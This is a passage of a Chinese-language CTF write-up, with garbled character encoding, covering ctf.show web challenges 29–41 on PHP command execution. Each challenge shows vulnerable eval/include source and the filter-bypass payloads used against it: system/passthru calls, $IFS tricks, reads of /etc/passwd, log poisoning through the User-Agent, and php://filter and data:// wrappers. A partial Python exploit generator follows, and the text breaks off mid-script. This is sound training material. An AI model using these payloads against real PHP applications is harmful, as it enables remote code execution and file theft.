´ç›®å½•ç»“æ„å³å¯ï¼Œæœ€ç»ˆç›®å½•ä¸º<code>/72/20</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/72/20/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>be394b7f-7bef-4c10-9d1a-02990c1f1e1e.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Thu, 03 Sep 2020 13:35:52 GMT</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;5f50f138-14&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>flag</code>ï¼Œç”¨<code>fla*</code>ç»•è¿‡å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">flag.php index.php</span><br><span class="line"></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fla*&#x27;</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;ctfshow&#123;6dd0377a-43a4-4bb4-8316-e6733e2a13b3&#125;&#x27;</span>; */ <span class="comment"># @link: https://ctfer.com # @email: h1xa@ctfer.com # @Last Modified time: 2020-09-04 00:14:17 # @Last Modified by: h1xa # @Date: 2020-09-04 00:14:07 # @Author: h1xa # -*- coding: utf-8 -*- /*</span></span><br></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨passthru</span><br><span class="line">/?c=passthru(&#x27;tac fla*&#x27;);</span><br><span class="line">*è¢«è¿‡æ»¤äº†ï¼Œå¦‚æœå¯ä»¥lsçœ‹åˆ°æ–‡ä»¶åï¼Œå¯ä»¥ç”¨?</span><br><span class="line">/?c=passthru(&#x27;tac fla?????&#x27;);</span><br><span class="line"></span><br><span class="line">åå­—èŠ‚ç¬¦é…åˆecho</span><br><span class="line">/?c=echo(`tac fla*`);</span><br><span class="line"></span><br><span class="line">å¸¦å‚æ•°è¾“å…¥</span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ª&quot;.&quot;</span><br><span class="line">pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</span><br><span class="line">scandir();éå†ç›®å½•ï¼Œè¿™é‡Œå› ä¸ºå‚æ•°ä¸º&quot;.&quot;æ‰€ä»¥éå†å½“å‰ç›®å½•</span><br><span class="line">array_reverse():å…ƒç»„å€’ç½®</span><br><span class="line">next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</span><br><span class="line">show_source():æŸ¥çœ‹æºç </span><br><span class="line"></span><br><span class="line">ç”¨%09ä»£æ›¿ç©ºæ ¼ï¼Œ%09æ˜¯åœ¨phpç¯å¢ƒä¸‹æ‰èƒ½ä½¿ç”¨</span><br><span class="line">/?c=passthru(&quot;tac%09fla*&quot;);</span><br><span class="line"></span><br><span class="line">$IFS$9ç»•è¿‡ç©ºæ ¼ï¼Œæ³¨æ„è½¬ä¹‰$ç¬¦å· </span><br><span class="line">/?c=passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_POST[1]?&gt;&amp;1=../../../../etc/passwd</span><br><span class="line">/?c=include$_POST[1]?&gt;&amp;1=../../../../var/log/nginx/access.log</span><br><span class="line">/?c=include$_POST[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">/?c=include%09$_POST[1]?&gt;&amp;1=../../../../etc/passwd</span><br><span class="line">/?c=include%0a$_POST[1]?&gt;&amp;1=../../../../etc/passwd</span><br><span class="line">/?c=include%0a$_POST[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">åœ¨User-Agentä¸­å†™å…¥&lt;?php system(&quot;cat flag.php&quot;)?&gt;åœ¨è®¿é—®æ—¥å¿—</span><br><span class="line">/?c=include$_POST[1]?&gt;&amp;1=../../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_POST[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">/?c=include%0A$_POST[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">/?c=include%0A$_GET[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">/?c=include%0A$_GET[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">/?c=include%0A$_GET[a]?&gt;&amp;a=data://text/plain, &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨ä¼ªåè®®<code>data</code>ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=data://text/plain, &lt;?php system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p>each() è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®&#x2F;å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€æ­¥<br>end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ<br>next() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½<br>prev() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›ä¸€ä½<br>array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</p></blockquote><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç•™ä¸‹äº†<code>|</code>è¿ç®—ç¬¦ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/miuzzx/article/details/108569080">yuå¸ˆå‚…</a>å’Œ<a href="https://www.wlhhlc.top/posts/14827/#web41">dota_st</a>çš„è„šæœ¬ç®€å•å†™äº†ä¸‹exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">OPAND = <span class="number">0</span></span><br><span class="line">OPOR = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Files = [<span class="string">&#x27;rce_cmd_and.txt&#x27;</span>, <span class="string">&#x27;rce_cmd_or.txt&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RceCmdGen</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, opcode, pattern</span>):</span><br><span class="line">        self._opcode = opcode</span><br><span class="line">        self.pattern = pattern</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._opcode</span><br><span class="line"></span><br><span class="line"><span class="meta">    @opcode.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> opcode&gt;=<span class="number">0</span> <span class="keyword">and</span> opcode&lt;=<span class="number">1</span>:</span><br><span class="line">            self._opcode = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;range(2) need&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_rce_or_gen</span>(<span class="params">self</span>):</span><br><span class="line">        content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (re.match(self.pattern, <span class="built_in">chr</span>(i), re.I) <span class="keyword">or</span> re.match(self.pattern, <span class="built_in">chr</span>(j), re.I)):</span><br><span class="line">                    k = i|j</span><br><span class="line">                    <span class="keyword">if</span> k&gt;=<span class="number">32</span> <span class="keyword">and</span> k&lt;=<span class="number">126</span>:</span><br><span class="line">                        param_1 = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                        param_2 = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                        content += <span class="string">&#x27;&#123;&#125; &#123;&#125; &#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">chr</span>(k), param_1, param_2)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rce_cmd_or.txt&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rce_gen</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(self.pattern, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">if</span> self._opcode == <span class="number">1</span>:</span><br><span class="line">                self._rce_or_gen()</span><br><span class="line">            <span class="keyword">elif</span> self._opcode == <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;To be continued...\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Opcode Error&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;&quot;str&quot; type need&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;exit: input exit in function or command&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_argv</span>():</span><br><span class="line">    <span class="keyword">if</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg, opcode</span>):</span><br><span class="line">    _param_1 = <span class="string">&#x27;&#x27;</span></span><br><span 